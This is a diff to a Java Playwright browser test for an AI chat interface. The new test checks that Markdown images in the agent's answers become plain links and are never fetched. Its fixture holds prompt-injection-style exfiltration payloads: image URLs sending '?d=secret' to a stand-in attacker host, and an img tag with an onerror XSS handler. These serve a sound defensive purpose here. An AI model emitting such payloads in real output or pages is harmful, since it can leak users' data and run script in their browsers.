@@ -32,11 +32,8 @@ import org.springframework.boot.webmvc.autoconfigure.WebMvcAutoConfiguration;
 import org.springframework.context.annotation.Bean;
 import org.springframework.context.annotation.Configuration;
 import org.springframework.context.annotation.Import;
-import org.webjars.WebJarVersionLocator;
 import tools.jackson.databind.ObjectMapper;
 
-import java.io.IOException;
-import java.io.InputStream;
 import java.time.Instant;
 import java.util.List;
 import java.util.Map;
@@ -85,6 +82,13 @@ class ChatMarkdownBrowserTest {
 
             END-OF-ANSWER""";
 
+    static final String IMAGE_ANSWER = """
+            A chart: ![Q&A <chart>](https://attacker.example/md?d=secret "Sales") and a bare one ![](https://attacker.example/bare?d=secret)
+
+            Raw: <img src="https://attacker.example/raw?d=secret" onerror="window.__xss='raw'">
+
+            END-OF-ANSWER""";
+
     static Playwright playwright;
     static Browser browser;
 
@@ -98,6 +102,12 @@ class ChatMarkdownBrowserTest {
     List<ChatHistory.Entry> history;
 
     Page page;
+
+    /** Every URL the page requested; anything not on this server is also blocked. */
+    List<String> requests;
+
+    /** Every response that was not a success, as "status url". */
+    List<String> failedResponses;
 
     @BeforeAll
     static void startBrowser() throws Exception {
@@ -121,6 +131,8 @@ class ChatMarkdownBrowserTest {
     @BeforeEach
     void openPage() {
         history.clear();
+        requests = new CopyOnWriteArrayList<>();
+        failedResponses = new CopyOnWriteArrayList<>();
         page = newPage("en-US");
     }
 
@@ -128,7 +140,11 @@ class ChatMarkdownBrowserTest {
         Page page = browser.newPage(new Browser.NewPageOptions().setLocale(locale).setTimezoneId("Asia/Tokyo"));
         page.onPageError(error -> System.out.println("[browser] page error: " + error));
         page.onConsoleMessage(message -> System.out.println("[browser] " + message.type() + ": " + message.text()));
-        serveCdnFilesLocally(page);
+        page.onRequest(request -> requests.add(request.url()));
+        page.onResponse(response -> {
+            if (response.status() >= 400) failedResponses.add(response.status() + " " + response.url());
+        });
+        page.route(url -> !url.startsWith("http://localhost:" + port + "/"), Route::abort);
         // Anything a payload manages to run is recorded here instead of opening a dialog
         page.addInitScript("window.__xss = null; window.alert = function (m) { window.__xss = 'alert:' + m; };");
         return page;
@@ -156,6 +172,49 @@ class ChatMarkdownBrowserTest {
                 .contains("<script>window.__xss='script'</script>")
                 .contains("<img src=x onerror=alert(1)>");
         assertThat(lastAgentText()).isEqualTo(streamedText);
+    }
+
+    @Test
+    void imagesInModelOutputAreLinksAndAreNeverLoaded() {
+        agent.answer = IMAGE_ANSWER;
+
+        send("show me a chart");
+        assertImagesAreLinksAndNothingLoaded();
+
+        page.reload();
+        waitForAnswer();
+        assertImagesAreLinksAndNothingLoaded();
+    }
+
+    private void assertImagesAreLinksAndNothingLoaded() {
+        assertNothingRan();
+        // (the mascot in each message header is the page's own image; message bodies have none)
+        assertThat(page.locator(".ar-msg__body :is(img, picture, source, video, audio, track, iframe, object, embed)").count())
+                .isZero();
+
+        // Markdown images become ordinary links, labelled with the alt text or else the URL
+        @SuppressWarnings("unchecked")
+        List<Map<String, String>> links = (List<Map<String, String>>) page.evaluate("""
+                () => [...[...document.querySelectorAll('#chat-messages .ar-msg--agent .ar-md')].pop().querySelectorAll('a')]
+                    .map(a => ({text: a.textContent, href: a.getAttribute('href'), target: a.getAttribute('target'),
+                                rel: a.getAttribute('rel'), title: a.getAttribute('title') || ''}))""");
+        assertThat(links).containsExactly(
+                Map.of("text", "Q&A <chart>", "href", "https://attacker.example/md?d=secret",
+                        "target", "_blank", "rel", "noopener noreferrer", "title", "Sales"),
+                Map.of("text", "https://attacker.example/bare?d=secret", "href", "https://attacker.example/bare?d=secret",
+                        "target", "_blank", "rel", "noopener noreferrer", "title", ""));
+
+        // The raw tag is shown as text
+        assertThat(lastAgentText()).contains("<img src=\"https://attacker.example/raw?d=secret\" onerror=\"window.__xss='raw'\">");
+
+        // Nothing was requested from the image host, or from anywhere but this server
+        assertThat(requests).noneMatch(url -> url.contains("attacker.example"));
+        assertThat(requests).isNotEmpty().allMatch(url -> url.startsWith("http://localhost:" + port + "/"));
+        // and everything the page needs (Bulma, htmx, its ws extension, fonts, scripts) was served
+        assertThat(requests).anyMatch(url -> url.endsWith("/webjars/bulma/css/bulma.min.css"))
+                .anyMatch(url -> url.endsWith("/webjars/htmx.org/dist/htmx.min.js"))
+                .anyMatch(url -> url.endsWith("/webjars/htmx-ext-ws/ws.js"));
+        assertThat(failedResponses).isEmpty();
     }
 
     @Test
@@ -312,32 +371,6 @@ class ChatMarkdownBrowserTest {
         assertThat(page.locator("#chat-messages script").count()).isZero();
         assertThat(page.locator("#chat-messages [onerror], #chat-messages [onmouseover]").count()).isZero();
         assertThat(page.locator("#chat-messages a[href^='javascript']").count()).isZero();
-    }
-
-    /** base.html.peb loads Bulma, htmx and its ws extension from a CDN; serve the same versions from WebJars. */
-    private static void serveCdnFilesLocally(Page page) {
-        WebJarVersionLocator webJars = new WebJarVersionLocator();
-        Map<String, String[]> cdn = Map.of(
-                "htmx.org@", new String[]{"htmx.org", "dist/htmx.min.js", "text/javascript"},
-                "htmx-ext-ws@", new String[]{"htmx-ext-ws", "ws.js", "text/javascript"},
-                "bulma@", new String[]{"bulma", "css/bulma.min.css", "text/css"});
-        page.route("https://cdn.jsdelivr.net/**", route -> {
-            String url = route.request().url();
-            cdn.entrySet().stream()
-                    .filter(e -> url.contains(e.getKey()))
-                    .findFirst()
-                    .ifPresentOrElse(e -> fulfill(route, webJars.fullPath(e.getValue()[0], e.getValue()[1]), e.getValue()[2]),
-                            route::abort);
-        });
-    }
-
-    private static void fulfill(Route route, String classpathPath, String contentType) {
-        try (InputStream in = ChatMarkdownBrowserTest.class.getClassLoader().getResourceAsStream(classpathPath)) {
-            assertThat(in).as(classpathPath).isNotNull();
-            route.fulfill(new Route.FulfillOptions().setStatus(200).setContentType(contentType).setBodyBytes(in.readAllBytes()));
-        } catch (IOException e) {
-            route.abort();
-        }
     }
 
     @Configuration(proxyBeanMethods = false)
